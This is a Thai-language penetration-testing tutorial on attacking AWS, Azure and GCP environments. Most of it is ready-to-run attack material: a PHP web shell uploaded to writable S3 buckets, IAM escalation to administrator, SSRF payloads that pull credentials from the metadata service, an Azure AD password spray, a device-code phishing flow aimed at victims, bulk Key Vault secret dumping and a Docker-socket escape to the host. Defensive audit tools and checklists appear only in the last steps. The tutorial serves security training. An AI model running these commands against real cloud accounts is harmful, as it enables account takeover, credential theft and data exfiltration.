# Part 13: Cloud Security - AWS & Azure (Steps 121-130)

## บทนำ

Cloud Security เป็นทักษะที่จำเป็นสำหรับ Penetration Tester ยุคใหม่ เนื่องจากองค์กรส่วนใหญ่ย้ายระบบไปยัง Cloud การทำ Cloud Penetration Testing ต้องเข้าใจทั้ง AWS, Azure และ GCP รวมถึง Misconfiguration ที่พบบ่อย เช่น S3 Bucket Public, IAM Privilege Escalation, Metadata Service Exploitation และ Container Breakout

---

## Step 121: AWS Reconnaissance & Enumeration

```bash
# ==========================================
# AWS Recon - Initial Access
# ==========================================

# ==========================================
# 1. ติดตั้ง AWS CLI
# ==========================================
sudo apt install awscli
pip3 install awscli boto3

# Configure credentials
aws configure
# AWS Access Key ID: AKIAXXXXXXXXXXXXXXXX
# AWS Secret Access Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# Default region name: ap-southeast-1
# Default output format: json

# ==========================================
# 2. ตรวจสอบ Identity
# ==========================================

# ใครเราเป็น?
aws sts get-caller-identity
# {
#     "UserId": "AIDAXXXXXXXXXXXXXXXX",
#     "Account": "123456789012",
#     "Arn": "arn:aws:iam::123456789012:user/pentester"
# }

# ==========================================
# 3. IAM Enumeration
# ==========================================

# List users
aws iam list-users
aws iam list-users --output table

# User details
aws iam get-user --user-name username
aws iam list-user-policies --user-name username
aws iam list-attached-user-policies --user-name username
aws iam list-groups-for-user --user-name username

# List groups
aws iam list-groups
aws iam get-group --group-name groupname
aws iam list-group-policies --group-name groupname
aws iam list-attached-group-policies --group-name groupname

# List roles
aws iam list-roles
aws iam get-role --role-name rolename
aws iam list-role-policies --role-name rolename

# List policies
aws iam list-policies --scope Local
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/PolicyName
aws iam get-policy-version --policy-arn arn:... --version-id v1

# ==========================================
# 4. S3 Enumeration
# ==========================================

# List buckets
aws s3 ls

# List bucket contents
aws s3 ls s3://bucket-name
aws s3 ls s3://bucket-name --recursive

# ดาวน์โหลดทุกไฟล์
aws s3 sync s3://bucket-name /tmp/bucket-data

# ตรวจสอบ bucket policy
aws s3api get-bucket-policy --bucket bucket-name
aws s3api get-bucket-acl --bucket bucket-name

# ตรวจสอบ Public Buckets (ไม่ต้อง credentials)
aws s3 ls s3://target-bucket --no-sign-request

# ==========================================
# 5. EC2 Enumeration
# ==========================================

# List instances
aws ec2 describe-instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,PrivateIpAddress,State.Name,Tags]' --output table

# Security groups
aws ec2 describe-security-groups
aws ec2 describe-security-groups --filters "Name=group-name,Values=open-sg"

# Key pairs
aws ec2 describe-key-pairs

# Snapshots (Public)
aws ec2 describe-snapshots --owner-ids self
aws ec2 describe-snapshots --filters "Name=snapshot-id,Values=snap-xxx"

# ==========================================
# 6. อื่นๆ
# ==========================================

# Lambda functions
aws lambda list-functions
aws lambda get-function --function-name function-name

# RDS databases
aws rds describe-db-instances

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id secret-name

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameter --name /path/to/param --with-decryption
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# CloudFormation stacks (มักมี credentials)
aws cloudformation list-stacks
aws cloudformation get-template --stack-name stack-name
```

---

## Step 122: AWS S3 Attacks

```bash
# ==========================================
# S3 Bucket Attacks
# ==========================================

# ==========================================
# 1. หา Public S3 Buckets
# ==========================================

# เดา bucket names
# Format: company-name, company-backup, company-dev, company-prod, company-logs

# ใช้ tools:
# AWSBucketDump
git clone https://github.com/jordanpotti/AWSBucketDump.git
python3 AWSBucketDump.py -l company_names.txt -g interesting_Keywords.txt

# S3Scanner
pip3 install s3scanner
s3scanner scan --buckets-file company_names.txt

# ==========================================
# 2. ตรวจสอบ Bucket Permissions
# ==========================================

# Anonymous read
aws s3 ls s3://bucket-name --no-sign-request

# Anonymous write (อันตราย!)
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://bucket-name/test.txt --no-sign-request

# ตรวจสอบ ACL
aws s3api get-bucket-acl --bucket bucket-name

# ==========================================
# 3. S3 Object Versioning Attack
# ==========================================

# ดู versions ทั้งหมด (อาจมีไฟล์เก่าที่ถูกลบ)
aws s3api list-object-versions --bucket bucket-name

# ดาวน์โหลด version เก่า
aws s3api get-object \
    --bucket bucket-name \
    --key filename.txt \
    --version-id "VersionId" \
    /tmp/old-file.txt

# ==========================================
# 4. S3 Static Website
# ==========================================

# ตรวจสอบ static website hosting
aws s3api get-bucket-website --bucket bucket-name

# หาไฟล์ backup/config
aws s3 ls s3://bucket-name --recursive | grep -E "\.(bak|backup|sql|config|env|log)$"

# ==========================================
# 5. อัปโหลด Malicious ไฟล์
# ==========================================

# ถ้า write access ได้
# อัปโหลด web shell
cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

aws s3 cp /tmp/shell.php s3://bucket-name/uploads/shell.php

# ==========================================
# 6. S3 Presigned URL
# ==========================================

# สร้าง presigned URL (ถ้าเข้าถึง S3 ได้)
aws s3 presign s3://bucket-name/sensitive-file.txt --expires-in 3600

# ==========================================
# 7. ค้นหา Credentials ใน S3
# ==========================================

# ดาวน์โหลดและค้นหา
aws s3 sync s3://bucket-name /tmp/s3-data --no-sign-request 2>/dev/null
grep -r "AKIA" /tmp/s3-data/          # AWS Access Keys
grep -r "password" /tmp/s3-data/       # Passwords
grep -r "secret" /tmp/s3-data/         # Secrets
grep -r "api_key" /tmp/s3-data/        # API Keys
```

---

## Step 123: AWS IAM Privilege Escalation

```bash
# ==========================================
# IAM Privilege Escalation
# ==========================================

# ==========================================
# 1. ตรวจสอบ Permissions
# ==========================================

# ใช้ enumerate-iam
pip3 install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key ... --region ap-southeast-1

# ใช้ Pacu (AWS exploitation framework)
pip3 install pacu
pacu
# > import_keys
# > run iam__enum_permissions

# ==========================================
# 2. Common Escalation Paths
# ==========================================

# ==========================================
# Path 1: iam:CreatePolicyVersion
# ==========================================
# สร้าง policy version ใหม่ที่ให้ Admin permissions

aws iam create-policy-version \
    --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
    --policy-document file://admin_policy.json \
    --set-as-default

# admin_policy.json:
cat > /tmp/admin_policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
    }]
}
EOF

# ==========================================
# Path 2: iam:AttachUserPolicy
# ==========================================
# แนบ AdministratorAccess policy ให้ตัวเอง

aws iam attach-user-policy \
    --user-name current-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# ==========================================
# Path 3: iam:CreateAccessKey (สำหรับ user อื่น)
# ==========================================

aws iam create-access-key --user-name admin-user
# ได้ Access Key ของ admin

# ==========================================
# Path 4: iam:PassRole + EC2/Lambda/etc
# ==========================================

# ถ้ามี iam:PassRole และ ec2:RunInstances
# สร้าง EC2 ด้วย role ที่มี Admin permissions
aws ec2 run-instances \
    --image-id ami-xxx \
    --instance-type t2.micro \
    --iam-instance-profile Name=AdminRole \
    --user-data file://userdata.sh

# ==========================================
# Path 5: sts:AssumeRole
# ==========================================

# ตรวจสอบ roles ที่เรา assume ได้
aws iam list-roles | grep "AssumeRolePolicyDocument"

# Assume role
aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/AdminRole \
    --role-session-name pentest

# ใช้ credentials จาก assume-role
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# ==========================================
# 3. Pacu - Automated Escalation
# ==========================================

pip3 install pacu
pacu
# > set_keys
# > run iam__privesc_scan
# > run iam__privesc_scan --scan_only  # ดูก่อน

# ==========================================
# 4. ตรวจสอบ CloudTrail Logging
# ==========================================

# ดู CloudTrail trails
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name trail-name

# ดู event history (90 วัน)
aws cloudtrail lookup-events --max-results 50
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
```

---

## Step 124: AWS Metadata Service (SSRF to RCE)

```bash
# ==========================================
# AWS Metadata Service Attack
# ==========================================

# Instance Metadata Service (IMDS)
# URL: http://169.254.169.254/latest/meta-data/

# ==========================================
# 1. ผ่าน SSRF
# ==========================================

# ถ้าเจอ SSRF ใน web app ที่รันบน EC2
# ลอง:
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# ได้ temporary credentials:
# {
#   "Code" : "Success",
#   "Type" : "AWS-HMAC",
#   "AccessKeyId" : "ASIAXXX",
#   "SecretAccessKey" : "xxx",
#   "Token" : "xxx",
#   "Expiration" : "2024-01-01T00:00:00Z"
# }

# ใช้ credentials:
export AWS_ACCESS_KEY_ID=ASIAXXX
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx

aws sts get-caller-identity

# ==========================================
# 2. IMDSv2 (Version ใหม่)
# ==========================================

# IMDSv2 ต้องใช้ PUT request ก่อน
# ขอ token ก่อน
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# ใช้ token
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ==========================================
# 3. Metadata ที่น่าสนใจ
# ==========================================

BASE="http://169.254.169.254/latest"

# Instance info
curl $BASE/meta-data/instance-id
curl $BASE/meta-data/hostname
curl $BASE/meta-data/public-ipv4
curl $BASE/meta-data/local-ipv4
curl $BASE/meta-data/placement/availability-zone
curl $BASE/meta-data/ami-id

# SSH public key
curl $BASE/meta-data/public-keys/0/openssh-key

# User data (อาจมี secrets!)
curl $BASE/user-data

# IAM role credentials
curl $BASE/meta-data/iam/security-credentials/
ROLE=$(curl $BASE/meta-data/iam/security-credentials/)
curl $BASE/meta-data/iam/security-credentials/$ROLE

# ==========================================
# 4. ใช้ ssrf-sheriff สำหรับ SSRF testing
# ==========================================

# Test SSRF
# ลอง payloads:
# http://169.254.169.254/latest/meta-data/
# http://[::ffff:169.254.169.254]/latest/meta-data/
# http://169.254.169.254
# http://169.254.169.254.xip.io
# http://169.254.0xfe.0x80/  (hex)

# ==========================================
# 5. ECS/EKS Metadata
# ==========================================

# ECS Container credentials
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

---

## Step 125: Azure Reconnaissance

```bash
# ==========================================
# Azure Penetration Testing
# ==========================================

# ==========================================
# 1. ติดตั้ง Tools
# ==========================================

# Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az login

# Az PowerShell module
Install-Module -Name Az

# Azure AD module
pip3 install azure-cli
pip3 install msrestazure
pip3 install adal

# ROADtools (Azure AD enumeration)
pip3 install roadrecon

# AADInternals (PowerShell)
Install-Module AADInternals

# ==========================================
# 2. Azure CLI Enumeration
# ==========================================

# Login
az login
az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID

# ตรวจสอบ identity
az account show
az account list

# Subscriptions
az account list --output table

# Resource Groups
az group list --output table

# Virtual Machines
az vm list --output table
az vm list-ip-addresses --output table

# Storage Accounts
az storage account list --output table
az storage container list --account-name storage-name

# Key Vault
az keyvault list
az keyvault secret list --vault-name vault-name
az keyvault secret show --vault-name vault-name --name secret-name

# App Registrations
az ad app list --output table

# Service Principals
az ad sp list --output table

# ==========================================
# 3. Azure AD Enumeration
# ==========================================

# Users
az ad user list --output table
az ad user show --id user@domain.com

# Groups
az ad group list --output table
az ad group member list --group "GroupName"

# Roles
az role definition list
az role assignment list --all

# ==========================================
# 4. ROADtools
# ==========================================

# Gather data
roadrecon gather -u user@domain.com -p password

# หรือด้วย token
roadrecon gather --access-token TOKEN

# Run web interface
roadrecon gui
# เปิด http://localhost:5000

# ==========================================
# 5. BloodHound Azure
# ==========================================

pip3 install bloodhound-azure
azurehound -u user@domain.com -p password

# Import เข้า BloodHound
# Cypher queries:
# MATCH (n) WHERE n.azuretenant IS NOT NULL RETURN n
```

---

## Step 126: Azure Attack Techniques

```bash
# ==========================================
# Azure Attack Techniques
# ==========================================

# ==========================================
# 1. Azure Metadata Service
# ==========================================

# Instance Metadata Service
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# ขอ Access Token จาก Managed Identity
curl -H "Metadata:true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# ใช้ Token:
TOKEN=$(curl -s -H "Metadata:true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# List subscriptions
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"

# ==========================================
# 2. Azure Storage Attack
# ==========================================

# Anonymous Blob Access
# ค้นหา storage accounts
# URL format: https://ACCOUNT.blob.core.windows.net/CONTAINER/FILE

# ตรวจสอบ anonymous access:
az storage container list --account-name storageaccount --public-access blob

# ใช้ azcopy
azcopy list "https://account.blob.core.windows.net/container"
azcopy copy "https://account.blob.core.windows.net/container/*" /tmp/azure-data/

# ==========================================
# 3. Azure AD Password Spray
# ==========================================

# ใช้ MSOLSpray
git clone https://github.com/dafthack/MSOLSpray.git
cd MSOLSpray

# สร้าง user list
cat > users.txt << 'EOF'
admin@domain.com
user1@domain.com
john.doe@domain.com
EOF

# Spray
Invoke-MSOLSpray -UserList users.txt -Password "Winter2024!" -Verbose

# ==========================================
# 4. Azure AD Phishing (Device Code Flow)
# ==========================================

# ขอ device code
curl -X POST \
    "https://login.microsoftonline.com/common/oauth2/devicecode" \
    -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.microsoft.com"

# ได้ user_code -> ส่งให้ victim เปิด https://microsoft.com/devicelogin

# Poll สำหรับ token
curl -X POST \
    "https://login.microsoftonline.com/common/oauth2/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=DEVICE_CODE&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c"

# ==========================================
# 5. Azure IAM Privilege Escalation
# ==========================================

# ตรวจสอบ role assignments
az role assignment list --all

# ค้นหา Owner/Contributor roles
az role assignment list --all --query "[?roleDefinitionName=='Owner']"

# เพิ่ม role ให้ตัวเอง (ถ้ามีสิทธิ์)
az role assignment create \
    --assignee user@domain.com \
    --role "Owner" \
    --scope "/subscriptions/SUBSCRIPTION_ID"

# Reset password ของ user (ถ้ามีสิทธิ์ใน AAD)
az ad user update --id user@domain.com --password "NewPass123!" --force-change-password-next-sign-in false

# ==========================================
# 6. Azure Key Vault Attack
# ==========================================

# ถ้ามีสิทธิ์เข้าถึง Key Vault
az keyvault secret list --vault-name vault-name --output table

# ดึงทุก secrets
for secret in $(az keyvault secret list --vault-name vault-name --query "[].name" -o tsv); do
    echo "=== $secret ==="
    az keyvault secret show --vault-name vault-name --name "$secret" --query "value" -o tsv
done
```

---

## Step 127: AWS Container & Lambda Attacks

```bash
# ==========================================
# AWS Container & Serverless Attacks
# ==========================================

# ==========================================
# 1. ECR (Elastic Container Registry) Attack
# ==========================================

# List repositories
aws ecr describe-repositories

# Get auth token
aws ecr get-login-password --region ap-southeast-1 | \
    docker login --username AWS --password-stdin \
    123456789012.dkr.ecr.ap-southeast-1.amazonaws.com

# Pull image
docker pull 123456789012.dkr.ecr.ap-southeast-1.amazonaws.com/app:latest

# Scan image for secrets
docker save image-name | tar -xO | strings | grep -E "(AKIA|password|secret|key)"

# ใช้ trufflesecurity/trufflehog
docker run --rm -v "$(pwd):/pwd" trufflesecurity/trufflehog:latest \
    docker --image 123456789012.dkr.ecr.ap-southeast-1.amazonaws.com/app:latest

# ==========================================
# 2. ECS (Elastic Container Service) Attack
# ==========================================

# List clusters
aws ecs list-clusters

# List tasks
aws ecs list-tasks --cluster cluster-name

# Describe task (หา role ที่ task ใช้)
aws ecs describe-tasks --cluster cluster-name --tasks task-arn

# Task Definition (มีข้อมูลสำคัญ)
aws ecs describe-task-definition --task-definition task-def-name

# Exec เข้า container (ถ้า ECS Exec เปิดอยู่)
aws ecs execute-command \
    --cluster cluster-name \
    --task task-arn \
    --container container-name \
    --interactive \
    --command "/bin/bash"

# ==========================================
# 3. Lambda Attack
# ==========================================

# List functions
aws lambda list-functions

# ดู environment variables (มักมี secrets!)
aws lambda get-function-configuration --function-name function-name

# ดู source code
aws lambda get-function --function-name function-name
# URL ใน 'Code.Location' - ดาวน์โหลด zip

# invoke function
aws lambda invoke \
    --function-name function-name \
    --payload '{"key": "value"}' \
    /tmp/output.json

# ==========================================
# 4. EKS (Elastic Kubernetes Service)
# ==========================================

# Get kubeconfig
aws eks update-kubeconfig --name cluster-name --region ap-southeast-1

# Enumerate
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces

# Decode secrets
kubectl get secret secret-name -o json | \
    python3 -c "import sys,json,base64;d=json.load(sys.stdin);[print(k,':',base64.b64decode(v).decode()) for k,v in d['data'].items()]"

# ==========================================
# 5. Container Breakout บน AWS
# ==========================================

# ถ้าอยู่ใน container บน EC2
# ตรวจสอบ metadata service

# หา AWS credentials
env | grep AWS
cat /proc/1/environ | tr '\0' '\n' | grep AWS

# ตรวจสอบ mounted volumes
df -h
mount | grep -v "proc\|sys\|dev\|run"

# ดู Docker socket
ls -la /var/run/docker.sock
# ถ้ามี -> breakout ได้!

docker run -it -v /:/host ubuntu chroot /host /bin/bash
```

---

## Step 128: Cloud Tools - ScoutSuite & Prowler

```bash
# ==========================================
# Cloud Security Auditing Tools
# ==========================================

# ==========================================
# 1. ScoutSuite - Multi-Cloud Auditing
# ==========================================

pip3 install scoutsuite

# AWS audit
scout aws --profile default

# Azure audit
scout azure --cli  # ใช้ az login ก่อน

# GCP audit
scout gcp --user-account

# Output: HTML report ใน scoutsuite-report/

# ==========================================
# 2. Prowler - AWS Security Assessment
# ==========================================

pip3 install prowler

# Basic audit
prowler aws

# เฉพาะ service
prowler aws --service s3 iam ec2

# CIS Benchmark
prowler aws --compliance cis_1.5_aws

# Output formats
prowler aws -M html json csv

# ==========================================
# 3. CloudSploit
# ==========================================

git clone https://github.com/aquasecurity/cloudsploit.git
cd cloudsploit
npm install

# AWS
node index.js --provider aws

# ==========================================
# 4. PMapper - IAM Principal Mapper
# ==========================================

pip3 install principalmapper

# Map IAM permissions
pmapper graph create
pmapper query "who can do s3:GetObject with resource arn:aws:s3:::sensitive-bucket/*"
pmapper query "who can escalate privileges"

# ==========================================
# 5. PACU - AWS Exploitation Framework
# ==========================================

pip3 install pacu

# เริ่ม session
pacu

# Import keys
> import_keys default  # จาก ~/.aws/credentials

# Useful modules:
> run iam__enum_permissions          # ดู permissions
> run iam__privesc_scan              # หา escalation paths
> run s3__download_bucket            # ดาวน์โหลด S3
> run ec2__enum                      # Enumerate EC2
> run lambda__enum                   # Enumerate Lambda
> run secrets__enum                  # หา secrets
> run cloudtrail__download_events    # ดาวน์โหลด logs

# ==========================================
# 6. CloudFox
# ==========================================

# ดาวน์โหลด
wget https://github.com/BishopFox/cloudfox/releases/latest/download/cloudfox-linux-amd64.zip
unzip cloudfox-linux-amd64.zip

# Run all checks
./cloudfox aws all-checks --profile default

# Specific checks
./cloudfox aws instances --profile default
./cloudfox aws secrets --profile default
./cloudfox aws permissions --profile default
./cloudfox aws endpoints --profile default
```

---

## Step 129: GCP Security Testing

```bash
# ==========================================
# Google Cloud Platform Security Testing
# ==========================================

# ==========================================
# 1. ติดตั้ง gcloud CLI
# ==========================================

curl https://sdk.cloud.google.com | bash
gcloud init
gcloud auth login
gcloud auth application-default login

# ==========================================
# 2. GCP Enumeration
# ==========================================

# ตรวจสอบ identity
gcloud config list
gcloud auth list

# Projects
gcloud projects list

# Set project
gcloud config set project PROJECT_ID

# Compute instances
gcloud compute instances list
gcloud compute instances describe INSTANCE_NAME

# Storage buckets
gsutil ls
gsutil ls gs://bucket-name
gsutil cat gs://bucket-name/file.txt

# Cloud Functions
gcloud functions list
gcloud functions describe FUNCTION_NAME

# Cloud Run
gcloud run services list

# IAM
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# ==========================================
# 3. GCP Metadata Service
# ==========================================

# จาก VM instance
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"

# Service Account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google"

# Project info
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
    -H "Metadata-Flavor: Google"

# Startup scripts (มักมี secrets)
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" \
    -H "Metadata-Flavor: Google"

# ==========================================
# 4. GCP IAM Privilege Escalation
# ==========================================

# ตรวจสอบ permissions
gcloud projects get-iam-policy PROJECT_ID

# Common escalation:
# 1. iam.serviceAccounts.getAccessToken
# 2. iam.serviceAccounts.actAs
# 3. roles/iam.serviceAccountTokenCreator

# ขอ token สำหรับ service account อื่น
gcloud iam service-accounts generate-access-token SA_EMAIL

# ==========================================
# 5. GCP Secret Manager
# ==========================================

gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME

# ==========================================
# 6. GKE (Google Kubernetes Engine)
# ==========================================

gcloud container clusters list
gcloud container clusters get-credentials CLUSTER_NAME --zone ZONE

kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
```

---

## Step 130: Cloud Security Automation & Reporting

```bash
# ==========================================
# Cloud Pentest Automation
# ==========================================

#!/usr/bin/env python3
# cloud_audit.py - Cloud Security Audit Script

import subprocess
import json
import os
from datetime import datetime

REPORT_DIR = f"cloud_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
os.makedirs(REPORT_DIR, exist_ok=True)

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout
    except:
        return ""

def aws_audit():
    print("[*] Starting AWS Audit...")
    results = {}
    
    # Identity
    results['identity'] = run_cmd("aws sts get-caller-identity")
    
    # S3 buckets
    results['s3_buckets'] = run_cmd("aws s3 ls")
    
    # EC2 instances
    results['ec2'] = run_cmd("aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,State.Name]' --output json")
    
    # IAM users
    results['iam_users'] = run_cmd("aws iam list-users --output json")
    
    # Security groups with 0.0.0.0/0
    results['open_sg'] = run_cmd("""aws ec2 describe-security-groups \
        --filters \"Name=ip-permission.cidr,Values=0.0.0.0/0\" \
        --query 'SecurityGroups[*].[GroupName,GroupId,Description]' \
        --output table""")
    
    # Secrets Manager
    results['secrets'] = run_cmd("aws secretsmanager list-secrets --output json")
    
    # Save results
    with open(f"{REPORT_DIR}/aws_audit.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"[+] AWS audit saved to {REPORT_DIR}/aws_audit.json")
    return results

def check_s3_public(buckets_output):
    print("[*] Checking S3 bucket permissions...")
    for line in buckets_output.strip().split('\n'):
        if line:
            bucket = line.split()[-1]
            result = run_cmd(f"aws s3api get-bucket-acl --bucket {bucket} 2>/dev/null")
            if "AllUsers" in result or "AuthenticatedUsers" in result:
                print(f"[!] PUBLIC BUCKET: {bucket}")

def check_iam_admin():
    print("[*] Checking for users with Admin access...")
    users = json.loads(run_cmd("aws iam list-users --output json") or '{}')
    
    for user in users.get('Users', []):
        username = user['UserName']
        policies = json.loads(run_cmd(f"aws iam list-attached-user-policies --user-name {username} --output json") or '{}')
        
        for policy in policies.get('AttachedPolicies', []):
            if 'AdministratorAccess' in policy['PolicyName'] or 'FullAccess' in policy['PolicyName']:
                print(f"[!] User {username} has {policy['PolicyName']}")

# Run audit
aws_results = aws_audit()
check_s3_public(aws_results.get('s3_buckets', ''))
check_iam_admin()

print(f"\n[+] Audit complete! Results saved to {REPORT_DIR}/")

# ==========================================
# checklist สำหรับ Cloud Pentest
# ==========================================

# AWS Checklist:
# [ ] S3 Buckets - Public access
# [ ] S3 Buckets - Versioning exposed
# [ ] IAM Users - MFA enabled
# [ ] IAM Users - Unused access keys
# [ ] IAM Policies - Overly permissive
# [ ] EC2 Security Groups - 0.0.0.0/0
# [ ] EC2 - IMDSv1 vs IMDSv2
# [ ] RDS - Publicly accessible
# [ ] RDS - Encryption enabled
# [ ] CloudTrail - Enabled all regions
# [ ] Config - Enabled
# [ ] GuardDuty - Enabled
# [ ] Lambda - Environment variables
# [ ] Secrets Manager vs Hardcoded

# Azure Checklist:
# [ ] Storage - Public blob access
# [ ] Key Vault - Access policies
# [ ] IAM - Privileged roles
# [ ] NSG - Inbound 0.0.0.0/0
# [ ] Azure AD - MFA enabled
# [ ] Service Principals - Credentials
# [ ] Azure Defender - Enabled
# [ ] Diagnostic Logging - Enabled
```

---

## สรุป Part 13

ในบทนี้คุณได้เรียนรู้:

✅ **Step 121**: AWS Reconnaissance & Enumeration  
✅ **Step 122**: S3 Bucket Attacks  
✅ **Step 123**: AWS IAM Privilege Escalation  
✅ **Step 124**: AWS Metadata Service (SSRF to RCE)  
✅ **Step 125**: Azure Reconnaissance  
✅ **Step 126**: Azure Attack Techniques  
✅ **Step 127**: AWS Container & Lambda Attacks  
✅ **Step 128**: Cloud Tools (ScoutSuite, Prowler, PACU, CloudFox)  
✅ **Step 129**: GCP Security Testing  
✅ **Step 130**: Cloud Security Automation & Reporting  

## เครื่องมือที่ใช้

| เครื่องมือ | ใช้สำหรับ |
|-----------|----------|
| AWS CLI | AWS Command Line Operations |
| PACU | AWS Exploitation Framework |
| ScoutSuite | Multi-Cloud Security Audit |
| Prowler | AWS Security Assessment |
| ROADtools | Azure AD Enumeration |
| CloudFox | Cloud Attack Surface |
| gcloud CLI | GCP Operations |
| PMapper | IAM Permission Mapping |

## แบบฝึกหัด

1. สร้าง AWS Free Tier Account และทดลอง enumerate
2. ใช้ CloudGoat (Vulnerable-by-design AWS) จาก Rhino Security
3. ทำ Azure Security Labs จาก Microsoft
4. ใช้ PACU ทำ IAM Privilege Escalation Lab
5. ทำ HackTheBox Cloud challenges

## ถัดไป: Part 14 - Container Security (Docker & Kubernetes)

---

*Part 13 | Steps 121-130 | ระดับ: สูง-มืออาชีพ*
